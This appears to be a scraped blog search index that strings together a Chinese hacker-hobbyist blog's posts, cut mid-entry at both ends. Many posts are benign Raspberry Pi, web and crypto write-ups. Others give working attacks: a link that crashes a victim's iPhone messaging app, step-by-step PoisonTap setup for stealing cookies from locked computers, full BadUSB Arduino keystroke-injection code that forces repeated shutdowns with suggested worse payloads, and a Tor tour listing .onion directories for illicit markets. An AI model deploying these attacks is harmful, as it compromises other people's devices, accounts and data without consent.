http://vincedes3.com/crashtext.html\n修复1. 把这个链接发给受害者手机 点我修复\n2. 该链接会触发短信的快捷链接，点击打开\n3. 进入发送短信页面\n4. 点击取消\n5. 删掉发送者的短信即可解决bug，请勿再次尝试点入\n本文翻译自：https://vincedes3.com/crash-message-app-iphone/\n","categories":["Hack"],"tags":["Hack"]},{"title":"2016，2017","url":"http://www.yfgeek.com/2016/12/31/2016，2017/","content":"似乎每年写年终总结已经成为习惯，2007年开始写博客，2009年开始，每年都象征性的写一个年终报告，或许是元旦或许是新年。\n每年这个时候，都会自觉地打开cnbeta.com看每一年的新年祝福。今年，也不例外，这么一看，已经9年过去了。\n2016在2016年，这一年励志在Github上取得更大的成就，知乎上娱乐为主。\n截止2016年12月31日，知乎累计收获了1388个赞，获得 252 次感谢，209 次收藏。\nGithub获得Star总数88个，607次代码贡献次数，702个粉丝。\n同时，2016年是忙碌的一年，是纠结的一年，是辛苦的一年。在这一年里，顺利的通过了雅思考试，在这一年里顺利的本科毕业，在这一年里励志转行计算机。\n在这一年里，好朋友各奔东西，都有了自己的发展方向与人生目标，而我却还在迷茫之中。\n20172017年是关键的一年，决定着人生发展方向，人生充满机遇，未来的事情，谁说的好呢？\n我不去想，\n是否能够成功 ，\n既然选择了远方 ，\n便只顾风雨兼程。\n","categories":["心情"],"tags":["心情"]},{"title":"Emoji 表情域名 引领未来","url":"http://www.yfgeek.com/2016/12/27/Emoji表情域名-引领未来/","content":"国外媒体报道，《牛津词典》(Oxford Dictionaries)今日公布了2015年年度词汇。今年的年度“词汇”很难发音，因为它并不是由字母组成，而是一个黄色的卡通笑脸，带着两滴眼泪。😂\n\nEmoji 等 Unicode 字符，浏览器Punycode的方式将 Unicode字符用ASCII进行编码。\n我也顺势跟风，注册了一个坑爹的TK域名。\n💌.tk\n\n查询在chrome浏览器上直接输入[想要注册的表情].com\n按下回车键，chrome浏览器会自动帮你转换为ASCII编码方式的格式。\n💌.tk\n转换为：\nhttp://xn--rr8h.tk/\n注册拿着自己的域名转换后的字符，比如xn–rr8h，去Godaddy或者别的域名网站直接搜就好啦。\n注意：\n.com域名目前无法注册任何包含emoji表情字符的域名，尚未开发，一旦开放，又是一笔巨大的商机。\n参考资料🐔.ws\n","categories":["Web"],"tags":["Web"]},{"title":"Raspberry Pi Zero联网奇妙记","url":"http://www.yfgeek.com/2016/12/21/Rasberry-Pi-Zero-联网奇妙记/","content":"说句实话，Zero真的不适合把玩，想让他连上网，太难了。\n痛点\n住公寓，有WiFi/Lan登录认证系统\n公寓的网络动态分配范围很大，很难快速找到树莓派的IP\n公寓的网络防止扫描端口，有惩罚策略\n没有显示器 无法查看树莓派Zero的状态\n树莓派Zero只有一个OTG USB接口\n树莓派Zero没有内置以太网Lan\n树莓派Zero没有无线网卡WiFi\n树莓派Zero没有蓝牙 更没有蓝牙局域网\n树莓派Zero除了核心部分 一无所有\n\n已有装备\n树莓派Zero\nUSB HUB 分线器\nUSB 以太网网卡\nUSB WIFI (芯片 8188EU)\n路由器\n网线一根\nMacBook Pro一台\n\n已有环境\nRaspbian系统\nvncserver\n\n解决方案整体思路\n其中 USB HUB USB网卡 临时路由器 PC 是临时之用 配置一旦完成 抛弃这些设备直接插上WiFi自动联网。\n\n去掉之前的USB网卡模式把sd卡取出，插入电脑\n在config.txt下删除\ndtoverlay=dwc2\n在cmdline.txt下删除\nmodules-load=dwc2,g_ether\n\n安装WiFi驱动之前遇到过很多坑，比如别的内核的WiFi驱动。\n首先手动下载\nhttps://dl.dropboxusercontent.com/u/80256631/install-wifi.tar.gz\n检查无线适配器版本，同时传到树莓派上\npi@zero:~ $ sudo ./install-wifiYour current kernel revision = 4.4.34+Your current kernel build    = #930Checking for a wifi module to determine the driver to install.Your wifi module is Bus 001 Device 003: ID 0bda:8179 Realtek Semiconductor Corp.And it uses the 8188eu driver.Checking for a new 8188eu wifi driver module for your current kernel.The script cannot access Dropbox to check a driver is available.\n手动下载https://dl.dropboxusercontent.com/u/80256631/8188eu-4.4.34-930.tar.gz\n切换WiFi到树莓派网络\nscp 8188eu-4.4.34-930.tar.gz pi@zero.local:~\n在树莓派下\ntar xzf  8188eu-4.4.34-930.tar.gzsudo ./install.shreboot\n然后检查一下 lsusb(这个其实不靠谱) \n然后再检查一下 ifconfig\nwlan0     Link encap:Ethernet  HWaddr 0c:82:68:12:93:8f          inet6 addr: fe80::4336:2657:c812:f11b/64 Scope:Link          UP BROADCAST MULTICAST  MTU:1500  Metric:1          RX packets:0 errors:0 dropped:6 overruns:0 frame:0          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\n果然正确安装了。\n配置WiFi但是wlan0     Link encap:Ethernet被识别为了以太网，接下来我们继续解决坑。\nsudo iwlist wlan0 scan\n\nCell 03 - Address: F0:B0:52:3B:7B:68                  ESSID:&quot;ASK4 Wireless&quot;                  Protocol:IEEE 802.11gn                  Mode:Master                  Frequency:2.417 GHz (Channel 2)                  Encryption key:off                  Bit Rates:144 Mb/s                  Quality=18/100  Signal level=70/100                  Extra:fm=0001\n随后对wpa_supplicant.conf文件进行编辑，使之加入到自己的网络里。\n请注意，key_mgmt=NONE表示没有WiFi密码(这是个查了很久猜得到的宝贵线索)，如果有密码请把这个更改为psk = &quot;密码&quot; \nsudo vi /etc/wpa_supplicant/wpa_supplicant.conf\n\ncountry=GBctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdevupdate_config=1network=&#123;        ssid=&quot;ASK4 Wireless&quot;        key_mgmt=NONE&#125;\n编辑/etc/network/interfaces文件，使wlan0为动态分配获取IP。\nsudo vi /etc/network/interfaces\nauto loiface lo inet loopbackiface eth0 inet dhcpauto wlan0allow-hotplug wlan0iface wlan0 inet dhcpwpa-conf /etc/wpa_supplicant/wpa_supplicant.confallow-hotplug wlan1iface wlan1 inet manual    wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf\n\n随后重启我们wlan0\nsudo ifdown wlan0sudo ifup wlan0\n\n如果能搜索到WiFi会自动进行DHCP获取ip地址阶段\nListening on LPF/wlan0/0c:82:68:12:93:8fSending on   LPF/wlan0/0c:82:68:12:93:8fSending on   Socket/fallbackDHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 8DHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 12DHCPREQUEST on wlan0 to 255.255.255.255 port 67DHCPOFFER from 10.80.192.1DHCPACK from 10.80.192.1bound to 10.80.200.83 -- renewal in 440 seconds.\n随后，用ifconfig命令查看一下获取的IP地址\nwlan0     Link encap:Ethernet  HWaddr 0c:82:68:12:93:8f          inet addr:10.80.200.83  Bcast:10.80.207.255  Mask:255.255.240.0          UP BROADCAST MULTICAST  MTU:1500  Metric:1          RX packets:0 errors:0 dropped:17 overruns:0 frame:0          TX packets:0 errors:0 dropped:1 overruns:0 carrier:0          collisions:0 txqueuelen:1000          RX bytes:4681 (4.5 KiB)  TX bytes:18372 (17.9 KiB)\n\n\n再对mac地址进行绑定，再进入vnc，试试看\n\n哇 可以上网了！\n然而悲痛的消息还有呢~\n内网隔离\nngrok TCP转发这难不倒我，用ngrok就可以解决，正好身在墙外，更加方便。\n下载ngrok\nwget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zipunzip ngrok-stable-linux-arm.zip\n配置开机启动项vi /etc/rc.local在exit 0 前面加入\n/home/pi/ngrok authtoken 你的AUTO/home/pi/ngrok tcp 22\n搞定！拔掉USB HUB，关掉路由器，重启！\n过了10分钟后，我们的树莓派上线了！\n\n用ssh命令连接一下\nssh pi@0.tcp.ngrok.io -p 13016\n连接速度超级快，如同本地一样，给ngrok官网点赞。\n\nlighttpd 部署总要搞点事情嘛，部署一个Web服务对于512MB的内存的树莓派Zero不过分吧。\n那么什么Web服务最合适呢？脑海第一时间想到轻量级的lighttpd，ngnix我都嫌弃费资源，那么就它了。\nsudo apt-get install -y lighttpd\n\n安装完成！目录在/var/www/html\n写好html，部署上去。\n那么如何才能办到同时映射到两个端口呢？ngrok的官方文档有提示。\nnano /home/pi/.ngrok2/ngrok.yml\nauthtoken: 你的AUTHregion: eujson_resolver_url: &quot;&quot;dns_resolver_ips: []tunnels:  app-foo:    addr: 80    proto: http    host_header: app-foo.dev  app-bar:    addr: 22    proto: tcp    host_header: app-bar.dev\n这样就部署了两个服务，app-foo，app-bar，不错，开机再启动他们。\nsudo nano /etc/rc.local\n把之前那句换成\n/home/pi/proj/ngrok/ngrok start --config /home/pi/.ngrok2/ngrok.yml app-foo app-bar\n好了，剩下我们要做的就是重启与等待。\n\n哈哈，上线了，访问一下。\n\n这个只有4英镑的树莓派实现联网后花费了：\n树莓派：4磅\nOTG线：0.86磅\nWIFI适配器：人民币25元\n储存卡：9磅\n谢谢观看忍耐全文。\n","categories":["Rasberry"],"tags":["Raspberry"]},{"title":"Wat 吐槽JavaScript","url":"http://www.yfgeek.com/2016/12/21/WAT-搞笑吐槽JavaScript/","content":"今天晚上在研究React技术栈头疼的时候，突然看到一个吐槽JavaScript的视频，简直搞笑，不过也挺客观的，毕竟是一个10天内攒出来的语言，虽然现在发展有ES支撑，但是依然非常零散，不过我按照视频里的做法试了一下，似乎有的返回结果不太一样。\nWat\n[] + []&quot;&quot;[] + &#123;&#125;&quot;[object Object]&quot;&#123;&#125; + []0&#123;&#125; + &#123;&#125;&quot;[object Object][object Object]&quot;Array(16)[undefined × 16]Array(16).join(&quot;wat&quot;)&quot;watwatwatwatwatwatwatwatwatwatwatwatwatwatwat&quot;Array(16).join(&quot;wat&quot; - 1 ) + &quot; Batman!&quot;&quot;NaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaN Batman!&quot;\n总之，看完这个视频，我就想说一句：\n\nJavascript的出生与死亡此外还有另一个视频 对JS从1995-2035年的历史阐述及大胆预测。\n\n十分客观的罗列出了JS的缺点、当前JS发展趋势必然产生的低效率问题。\n\n","categories":["笑话"],"tags":["Web","笑话"]},{"title":"30秒内盗取任意PC的Cookie神器 PoisonTap","url":"http://www.yfgeek.com/2016/12/18/30秒内盗取任意PC的Cookie和Session之神器PoisonTap/","content":"著名黑阔Samy Kamkar利用Raspberry Pi Zero黑客神器PoisonTap，只需30秒，就可以窃取有任意密码的电脑系统下的Cookie和Session，并实现长期后门安装。PoisonTap不是暴力破解密码，而是绕过密码。\n是的，买了Raspberry Pi Zero，有幸尝试了一下这个基于Node的工具，真乃神器。\n\n\n介绍PoisonTap 通吃 Windows/Mac/Linux系统。其实现原理十分猥琐。\n\n把自己伪装成有线网卡，一旦插入系统中，众所周知，所有的操作系统的规则都是这样的：\n\n有线网络&gt;无线网络\n\n也就是说，如果他连接着Wi-Fi，没关系，系统会以我的伪网卡为最高优先级。在系统处于锁屏状态下，只要有网络通信，无论系统通信哪个都会被强制跳转到我用于 攻击你的页面 ，成批量的窃取你的Cookie和Session。\n没错，就是你猜到的MITM，中间人攻击。通过PoisonTap，我们可以：\n\n模拟成一个伪USB网卡\n不需要解锁电脑就可以实现攻击\n劫持系统所有网络连接的所有流量 包括局域网\n窃取储存Alexa前一百万的网站的Cookie和Session\n用远程outbound的方式进行WebSocket或DNS重绑定攻击\n用HTTP的JS缓存禁止对该PC进行web后门安装，缓存涉及到上千个域名和cdn js缓存供应商\n截取Cookie后可以使用该PC的Cookie进行登录，实现中间人攻击的最终目标\n\n\nPoisonTap比你想象的更强大的是，PoisonTap能够突破以下普通MITM办不到的几点：\n\n锁屏密码\n路由表ARP的优先级设置和网络适配器优先级设置\n同源策略 (Same-Origin Policy)\nX-Frame-Options 响应头攻击\nCookie的HttpOnly安全设置\nCookie的SameSite安全属性\n两步/多步验证密码(2FA/MFA)\nDNS劫持\n跨域资源共享CORS\nHTTPS cookie 保护\n\n安装接着昨天的零网络配置，我们不需要任何网口 WiFi 蓝牙 就可以完成配置。\n注意！配置前请保证apt-get命令是可以用的且可以联网的，配置过程中不允许出错，否则会出大问题。\n首先，我们在本机下载下来这个神器Poisontap\ngit clone https://github.com/samyk/poisontap\n然后，我们用scp命令把Poisontap传到Raspberry Pi Zero上。\nscp -r poisontap pi@zero.local:~\n登录到树莓派上，运行\ncd poisontapecho -e &quot;\\nauto usb0\\nallow-hotplug usb0\\niface usb0 inet static\\n\\taddress 1.0.0.1\\n\\tnetmask 0.0.0.0&quot; &gt;&gt; /etc/network/interfacesecho &quot;dtoverlay=dwc2&quot; &gt;&gt; /boot/config.txtecho -e &quot;dwc2\\ng_ether&quot; &gt;&gt; /etc/modulessudo sed --in-place &quot;/exit 0/d&quot; /etc/rc.localecho &quot;/bin/sh /home/pi/poisontap/pi_startup.sh&quot; &gt;&gt; /etc/rc.localmkdir /home/pi/poisontapchown -R pi /home/pi/poisontapapt-get update &amp;&amp; apt-get upgradeapt-get -y install isc-dhcp-server dsniff screen nodejs\n确保以上都成功后，运行\nsudo cp dhcpd.conf /etc/dhcp/dhcpd.confreboot\n好了，已经安装好了，接下来我们可以Hack啦~\nHackCookie 和 Session窃取把配置好的树莓派重新插入电脑里，这时他已经变成了黑阔神器了。\n为了使攻击过程可视化，我们访问 www.google.com\n\n动画非常炫酷，这时候已经在窃取成千上万的网站的Cookie了，吃个小饼干。\n\n打开Chrome的工具看一看，哇。\n随后，Cookie都被保存在树莓派里了，我们连接上树莓派的SSH，看一下，成功。\ncat poisontap.cookies.log\n\n\n伪造网站远程后门参考https://github.com/samyk/poisontap\n","categories":["Hack"],"tags":["Hack"]},{"title":"Raspberry Pi Zero 无需键盘网络 配置教程","url":"http://www.yfgeek.com/2016/12/17/Raspberry-Pi-Zero-不借助网络的连接解决方案/","content":"我大概是个Raspberry Pi粉丝，到了英国后总感觉不买点树莓派的东西亏，可是之前已经在中国买了树莓派3了，于是决定买点特别的，做点有意思的事情。\n上个月，鉴于我在英国的巨大地理优势的缘故，买了一个4磅的Raspberry Pi Zero，不过网络上关于树莓派Zero的文章真的甚少，因为实在太难原价买到了。\n \n\n请注意，不要认为所谓的4磅很便宜，毕竟，我还多掏了2.50磅的邮费。树莓派Zero在中国并不便宜，因为树莓派Zero的产能有限，每周只能供很少的货，买树莓派Zero就像抢12306一样，我抢了两周，也正是因为这个原因，树莓派Zero在亚马逊的黄牛卖家卖20磅，淘宝卖120元左右，实际上原价只有40元左右。\n信仰充值滴！信仰充值成功！\n\n没有错，你没有看错，就是这么小，但是小也有小的坏处，没有USB口，没有Wi-Fi，没有网线接口，似乎什么都没有用。\n\n1Ghz, Single-core CPU\n512MB RAM\nMini HDMI and USB On-The-Go ports\nMicro USB power\nHAT-compatible 40-pin header\nComposite video and reset headers\n\n不过值得一提的是，USB On-The-Go接口也可以用来供电。\n发车网络上关于树莓派Zero如何连接配置大概有以下几种：\n\nOTG口转USB 接 USB以太网适配器\nOTG口转USB 接 USB Wi-Fi\nOTG口转USB 接 USB键盘 且 用HDMI接显示器\nGPIO接以太网适配器\n\n但是以上，都太麻烦了，对不对？\n那么关键问题就来了，如何才能在 没有网口、没有Wi-Fi、没有显示器、没有鼠标、没有键盘的情况下 配置可爱的树莓派Zero呢？\n我们 可以 把 树莓派 虚拟为 网卡，然后在内网连接它。\n1.下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，并且刷到你的SD Card里，Windows用Win32 Disk Imager， Mac/Linux 用命令，如下：\ndiskutil listdiskutil unmountDisk /dev/SD卡的标号 #如disk2cd /Users/ivan/Downloads/2016-11-25-raspbian-jessie #进入目录sudo dd bs=1m if=2016-11-25-raspbian-jessie.img of=/dev/rdisk2\n2.刷好系统后编辑config.txt文件，在最后一行下，另起一行添加：\ndtoverlay=dwc2\n保存文件\n3.最后，打开cmdline.txt文件。找到单词rootwait，在其之后添加：\nmodules-load=dwc2,g_ether\n\n4.添加一个文件名为ssh到根目录下，内容为空\n5.把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。\n\n6.Ping 一下raspberrypi.local看是否能通\nPING raspberrypi.local (169.254.70.245): 56 data bytes64 bytes from 169.254.70.245: icmp_seq=0 ttl=64 time=0.570 ms64 bytes from 169.254.70.245: icmp_seq=1 ttl=64 time=0.338 ms64 bytes from 169.254.70.245: icmp_seq=2 ttl=64 time=0.316 ms64 bytes from 169.254.70.245: icmp_seq=3 ttl=64 time=0.344 ms\n\n7.ssh连接raspberrypi.local，默认密码为raspberry\npi@raspberrypi.local\n\n配置因为没有网络，只能通过下载离线安装文件，传输到树莓派内，再在树莓派里安装。\n配置树莓派通过直接运行raspi-config命令\n你需要做\n\n容量扩展\n更改系统时区\n更改系统密码\n\n同时你需要通过执行sudo passwd root更改root密码\n安装vnc-server首先，去VNC官网下载最新版本的vnc-server\n用scp命令传到树莓派上\nscp /Users/ivan/Downloads/VNC-5.3.2-Linux-ARM-DEB.tar.gz  pi@raspberrypi.local:~\n在树莓派shell下，安装VNC\ntar xvf VNC-5.3.2-Linux-ARM-DEB.tar.gzsudo dpkg -i VNC-Server-5.3.2-Linux-ARM.deb\n\n\nvncpasswd -user  # 设置连接密码vncserver  # 启动vncserver\n\n连接raspberry.local:1测试成功\n\n设置代理本来想着，既然把它虚拟为网卡了，能否NAT网络给他让他上网？事实上，是失败的。\n那么我们有一个临时解决方案，就是设置代理\n首先，在本机搭建一个squid\nbrew updatebrew install squid\n然后下载SquidMan，安装。在本机开启端口为8080的HTTP代理服务，并把本机名称更为Mac。\n进入树莓派shell，输入：\ncd /etc/apt/apt.conf.dsudo vi /etc/apt/apt.conf.d\n最后一行加入一句话：\nAcquire::http::Proxy &quot;http://Mac.local:8080&quot;;\n保存\napt-get update一下，怎么样是不是能装软件了？\n感想这块小板子，我太喜欢了，好精致\n参考https://gist.github.com/gbaman/975e2db164b3ca2b51ae11e45e8fd40a#file-howtootgfast-md\n","categories":["Raspberry"],"tags":["Raspberry"]},{"title":"Google镜像站的搭建","url":"http://www.yfgeek.com/2016/12/11/Google镜像站的搭建/","content":"前两天，Google开发者大会高调的宣布Google Developers 网站终于正式上线了，希望Google能够解决一切问题，早日回归大陆市场。\n\n\n教程环境Centos 6 \n依赖\nnginx\npcre 正则\nngx_http_proxy_module 反向代理\nngx_http_substitutions_filter_module 多重替换\n\n安装## 安装 gcc &amp; git#apt-get install build-essential git gcc g++ make## 下载最新版源码# nginx 官网: # http://nginx.org/en/download.html#wget &quot;http://nginx.org/download/nginx-1.7.8.tar.gz&quot;## 下载最新版 pcre# pcre 官网:# http://www.pcre.org/#wget &quot;ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.38.tar.gz&quot;## 下载最新版 openssl# opessl 官网:# https://www.openssl.org/#wget &quot;https://www.openssl.org/source/openssl-1.0.1j.tar.gz&quot;## 下载最新版 zlib# zlib 官网:# http://www.zlib.net/#wget &quot;http://zlib.net/zlib-1.2.8.tar.gz&quot;## 下载本扩展#git clone https://github.com/cuber/ngx_http_google_filter_module## 下载 substitutions 扩展#git clone https://github.com/yaoweibin/ngx_http_substitutions_filter_module## 解压缩#tar xzvf nginx-1.7.8.tar.gztar xzvf pcre-8.38.tar.gztar xzvf openssl-1.0.1j.tar.gztar xzvf zlib-1.2.8.tar.gz## 进入 nginx 源码目录#cd nginx-1.7.8## 设置编译选项#./configure \\  --prefix=/opt/nginx-1.7.8 \\  --with-pcre=../pcre-8.38 \\  --with-openssl=../openssl-1.0.1j \\  --with-zlib=../zlib-1.2.8 \\  --with-http_ssl_module \\  --add-module=../ngx_http_google_filter_module \\  --add-module=../ngx_http_substitutions_filter_module## 编译, 安装# 如果扩展有报错, 请发 issue 到# https://github.com/cuber/ngx_http_google_filter_module/issues#makesudo make install## 启动, 安装过程到此结束#sudo /opt/nginx-1.7.8/sbin/nginxvi /opt/nginx-1.7.8/conf/nginx.conf\nhttp配置方式\nserver &#123;  server_name &lt;你的域名&gt;;  listen 80;  resolver 8.8.8.8;  location / &#123;    google on;  &#125;&#125;\nhttps配置方式\nserver &#123;  server_name &lt;你的域名&gt;;  listen 443;  ssl on;  ssl_certificate &lt;你的证书&gt;;  ssl_certificate_key &lt;你的私钥&gt;;  resolver 8.8.8.8;  location / &#123;    google on;  &#125;&#125;\n随后\n## 配置修改后, 需要 reload nginx 来让配置生效, #sudo /opt/nginx-1.7.8/sbin/nginx -s reload\n\n结果测试一下网站，是可以访问的，出于一些原因，我个人搭建的镜像站不予公开。\n参考技术https://github.com/cuber/ngx_http_google_filter_module\n","categories":["Ops"],"tags":["Ops"]},{"title":"OTR(Off-the-Record) 技术探讨","url":"http://www.yfgeek.com/2016/12/06/OTR技术探讨/","content":"中文网络上对OTR(Off-the-record)技术文章甚少，实际上聊天上采用OTR技术具有极大的安全性。OTR是一种结合Diffie-Hellman密钥交换算法、AES算法、SHA-1哈希算法的加密在明文情况下传输的技术。\n\n\n通过OTR技术，能够实现:\n\n加密聊天内容\n证明与你聊天的人就是与你聊天的人（防止中间人攻击）\n服务器无法记录你的真实聊天内容\n\n原理消息鉴别码(MAC)在密码学中，消息鉴别码(Message Authentication Code)是经过特定算法后产生的一小段信息，检查某段消息的完整性，以及作身份验证。\n\n假设有两个聊天用户，一个叫Alice，一个叫Bob。\n\n例如：Alice要给一个叫Bob发信，Alice将明文MK使用Hash算法进行摘要提取，提取结果为Hash(MK)，之后用Alice的私钥对摘要进行签名SA[Hash(MK)]，之后将MK和SA[Hash(MK)]一同发给Bob。\n其中SA[Hash(MK)]便可称之为消息鉴别码（MAC）。\n它可以用来检查在消息传递过程中，其内容是否被更改过，不管更改的原因是来自意外或是蓄意攻击。同时可以作为消息来源的身份验证，确认消息的来源。\n过程第一步，使用Diffie-Hellman双方交换公钥，确认公钥可以信任（只大概叙述，取mod运算被简化）。\n\nAlice（用A表示）和Bob（用B表示）每人分别取一个数x,y,并且取一个g\nA-&gt;B: Alice 生成g^x，并且签名SignAlice(g^x)\nB-&gt;A: Bob 生成g^y，并且签名SignBob(g^y)\nSS=g^xy: 生成共享的公钥\n\n第二步，使用公钥加密消息，消息传递。\n\n计算EK=Hash(SS), MK=Hash(EK) \nA-&gt;B: Encek(M), MAC(Encek(M),MK)\nEnc采用对称加密算法，比如AES算法用EK作为密钥\nBob 用MK验证MAC, 用EK解密M\n保密性和真实性得到了保证\n\n第三步，更新密钥\n\nAlice and Bob 再取一个x’,y’\nA-&gt;B: g^x’, MAC(g^x’, MK)\nB-&gt;A: g^y’, MAC(g^y’, MK)\nSS’ = H(g^x’y’)\nEK’ = H(SS’), MK’=H(EK’)\n随后，Alice和Bob安全清除掉之前的SS, x, y, EK\n\n第四步，继续保留 MK\n\nAlice 和 Bob 并不需要去清除MK\n事实上，在他们发下一条消息的时候还用着之前的MK\n这让中间人攻击者只能伪造过去的消息，并不能对现在的消息造成影响\n\n从宏观的角度上来看，假设是Alice是消息发送方 发给 Bob是消息接受方，大致步骤可以分为：\n\nAlice 和 Bob 都自行生成一对公私钥对，并将自己的公钥发送给对方\n若消息Alice打算发送消息M，则发送方首先用Bob的公钥和自己的私钥对M进行加密、签名，得到M1\nM1经由服务器被发送给消息接收方\nBob用自己的私钥和Alice的公钥对M1进行解密、签名校验，最终还原出M\n\nAwesome OTRs官网: https://otr.cypherpunks.ca/\npidgin-otr: https://otr.cypherpunks.ca/gentoo-install/otr-setup.html\nJavaScript 实现: https://github.com/arlolra/otr\notr.to源代码(JS): https://github.com/OTRMan/otr.to-chat\n一个python的otr项目: https://github.com/SpiralP/HexChat-otr\notrtalk(JS): https://github.com/mnaamani/otrtalk\nFacebook的OTR实现Chrome插件:https://github.com/osnr/otron\n一个基于OTR技术的P2P聊天系统: https://github.com/mehrvarz/P2pChatOTR\n小结研究算法的过程很有趣，也很累，每次应用OTR技术聊天的时候，我都强烈的感受到我的数据包被加密解密的过程，不知道为什么，感觉，异常，舒爽…\n","categories":["Hack"],"tags":["Hack"]},{"title":"Arduino Leonardo 打造 Bad USB","url":"http://www.yfgeek.com/2016/11/27/Arduino-Leonardo-打造-Bad-USB/","content":"嘿嘿嘿，又是一篇猥琐小文。\n\n\n简介什么是Bad USB？\n\nBadUSB最可怕的一点是恶意代码存在于U盘的固件中，由于PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法应对BadUSB进行攻击。\n简单来说，就是让USB设备伪装成但却充当键盘，被插入的电脑猝不及防会被迅速输入一定的“指令”，这个指令会让该电脑迅速成为肉鸡。\n目标打造一个廉价Bad USB，实现对 终端机、别人的电脑快速合法化入侵。\n\n原料\nArduino Leonardo\n普通安卓USB线\n\n举个🌰比如我们要实现一个插入优盘就让对方电脑关机的功能：\n用Arduino开发者工具，选择\n\nArduino Leonardo\n然后把程序烧录进去\n#include &lt;Keyboard.h&gt;void setup() &#123;//初始化   Keyboard.begin();//开始键盘通讯   delay(5000);//延时  Keyboard.press(KEY_LEFT_GUI);//win键   delay(500);   Keyboard.press(&#x27;r&#x27;);//r键   delay(500);   Keyboard.release(KEY_LEFT_GUI);  Keyboard.release(&#x27;r&#x27;);  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法  Keyboard.release(KEY_CAPS_LOCK);  delay(500);   Keyboard.println(&quot;CMD&quot;);  delay(500);   Keyboard.press(KEY_RETURN);  Keyboard.release(KEY_RETURN);  delay(3000);   Keyboard.println(&quot;shutdown -s -t 10&quot;);  Keyboard.press(KEY_RETURN);  Keyboard.release(KEY_RETURN);  Keyboard.press(KEY_CAPS_LOCK);  Keyboard.release(KEY_CAPS_LOCK);  Keyboard.end();//结束键盘通讯 &#125;void loop()//循环&#123;   Keyboard.begin();//开始键盘通讯   delay(5000);//延时  Keyboard.press(KEY_LEFT_GUI);//win键   delay(500);   Keyboard.press(&#x27;r&#x27;);//r键   delay(500);   Keyboard.release(KEY_LEFT_GUI);  Keyboard.release(&#x27;r&#x27;);  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法  Keyboard.release(KEY_CAPS_LOCK);  delay(500);   Keyboard.println(&quot;CMD&quot;);  delay(500);   Keyboard.press(KEY_RETURN);  Keyboard.release(KEY_RETURN);  delay(3000);   Keyboard.println(&quot;shutdown -s -t 10&quot;);  Keyboard.press(KEY_RETURN);  Keyboard.release(KEY_RETURN);  Keyboard.press(KEY_CAPS_LOCK);  Keyboard.release(KEY_CAPS_LOCK);  Keyboard.end();//结束键盘通讯 &#125;\n\n已经在多台Windows电脑上试验成功。\n效果\n进阶当然，你可以实现很多功能\n\n删除系统关键注册表使之蓝屏\n留后门\n新建用户\n用户提权\n调用Powershell下载木马\n调用Powershell下载木马及从内存中提取出当前用户的Windows密码\nrm -rf *\n\n此外，发现了一个专门收集Badusb的Github用户，非常有学习价值。\nhttps://github.com/Xyntax/BadUSB-code\n参考http://www.extremetech.com/extreme/191467-badusb-returns-hackers-publish-code-that-could-infect-millions-of-usb-deviceshttp://www.freebuf.com/sectool/107242.htmlhttp://www.freebuf.com/articles/terminal/53886.html\n","categories":["Hack"],"tags":["Hack"]},{"title":"TOR暗网的秘密","url":"http://www.yfgeek.com/2016/11/26/TOR暗网的秘密/","content":"TOR 是一个不可以吃的洋葱，众所周知洋葱新闻美国一个非常严谨的讽刺新闻公司，所以这个文章跟洋葱新闻没什么关系。\n以下内容纯属虚构。\n\n\n另一个互联网世界Tor 内网是另一个世界，另一个世界规则。在Tor 内网，有各种违禁交易，交易一般都是使用比特币的，保证了绝对的匿名性。\nTor 内网很有趣，几乎什么都有，甚至连搜索引擎，VPS服务，云服务都有。\n下面 我们来逛一逛都有什么 奇葩的 py交易。\n虚拟主机交易\n免费盗版市场盗版书\n\n盗版音乐\n\n英国枪支弹药交易\n比特币交易，一个Glock 19 - 9mm枪 500磅，比特币交易，当前交易金额相当于1.028比特币。\n（英国持枪是合法的，但是我不感兴趣）\n暗网iPhone交易不知道iPhone的货源，很便宜。\n\n办证类美国护照\n\n美国假身份证\n\n英国护照\n\n我只能感叹一句，这要是在我大中国，这价格绝对倒闭。太贵了。\n博客\n此外还有很多，没什么意思\n电子邮箱\n几乎是全匿名的电子邮箱，用比特message登录的\n政治各种资本主义反动派论坛\n\n\n雇佣黑阔\n日一个网站500欧元，还是挺赚的。\n其他的当然还有社工 库，😍情，各种其他的东西，这个不能写在这里，嘿嘿嘿。\n导航站http://dirnxxdraygbifgc.onion/\nhttp://torlinkbgs6aabns.onion/\nhttp://32rfckwuorlf4dlv.onion/\nhttp://torwikignoueupfm.onion/\nhttp://torlinkbgs6aabns.onion/\n搜索引擎http://xmh57jrzrnw6insl.onion/\n","categories":["Hack"],"tags":["Hack"]},{"title":"再玩Monyer的Hack Game","url":"http://www.yfgeek.com/2016/11/23/再玩Monyer的Hack-Game/","content":"之前混百度空间混久了，认识很多大牛，不乏monyer大牛。很早很早以前，他做了一个黑客小游戏，当时还不太会玩，现在突然打开发现，网站竟然还活着，决定重温经典。\n\n\n第零关http://monyer.com/game/game1/\n\n请点击链接进入第1关： 连接在左边→ ←连接在右边\n\n可是我们看不到链接地址，直接打开审查工具。\n&lt;span&gt;连接在左边→&lt;/span&gt;&lt;a href=&quot;first.php&quot;&gt;&lt;/a&gt;&lt;span&gt;←连接在右边&lt;/span&gt;\n好的输入地址，我么进入第一关\n第一关http://monyer.com/game/game1/first.php\n打开页面依然是什么都没有，这很正常。审查工具看代码。\n&lt;script type=&quot;text/rocketscript&quot; data-rocketoptimized=&quot;true&quot;&gt;    function check()&#123;        if(document.getElementById(&#x27;txt&#x27;).value==&quot;  &quot;)&#123;            window.location.href=&quot;hello.php&quot;;        &#125;else&#123;            alert(&quot;密码错误&quot;);        &#125;    &#125;&lt;/script&gt;\n\n好了 